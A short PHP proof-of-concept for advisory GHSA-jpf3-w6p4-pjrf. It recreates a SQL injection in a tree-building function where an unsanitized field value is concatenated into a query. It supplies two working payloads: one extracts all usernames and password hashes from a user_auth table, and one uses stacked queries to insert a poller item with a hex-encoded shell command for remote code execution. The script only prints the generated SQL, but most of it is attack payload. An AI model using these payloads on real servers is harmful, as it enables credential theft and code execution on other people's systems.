<?php
// Simplified demonstration of GHSA-jpf3-w6p4-pjrf

function demonstrate_vulnerability($item_id, $rule, $tree_items, $sql_filter) {
    $leaf_type_host = 1;
    $automation_tree_item_type_string = 'string';

    if ($rule['leaf_type'] == $leaf_type_host) {
        $sql_tables = 'FROM host AS h
            LEFT JOIN host_template AS ht
            ON h.host_template_id=ht.id ';

        $sql_where = 'WHERE h.id='. $item_id . ' AND h.deleted = "" ';
    }

    foreach ($tree_items as $tree_item) {
        if ($tree_item['field'] === $automation_tree_item_type_string) {
            // ...
        } else {
            $sql_field = $tree_item['field'] . ' AS source ';

            /* now we build up a new query for counting the rows */
            $sql = 'SELECT ' .
            $sql_field .
            $sql_tables .
            $sql_where . ' AND (' . $sql_filter . ')';

            echo "GENERATED SQL: $sql\n";
        }
    }
}

$rule = array('leaf_type' => 1);
$item_id = 456;
$sql_filter = "h.hostname LIKE '%'";

// Malicious payload from the advisory
$malicious_field = "(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM user_auth)";

$tree_items = array(
    array('field' => $malicious_field)
);

echo "Demonstrating Data Extraction in create_all_header_nodes...\n";
demonstrate_vulnerability($item_id, $rule, $tree_items, $sql_filter);

// Malicious payload for RCE
$rce_payload = "1 AS s FROM dual;INSERT INTO poller_item(local_data_id,rrd_name,action,arg1)VALUES(99999,0x72,1,0x736574736964206261736820...);--";

$tree_items_rce = array(
    array('field' => $rce_payload)
);

echo "\nDemonstrating RCE (Stacked Queries) in create_all_header_nodes...\n";
demonstrate_vulnerability($item_id, $rule, $tree_items_rce, $sql_filter);

?>
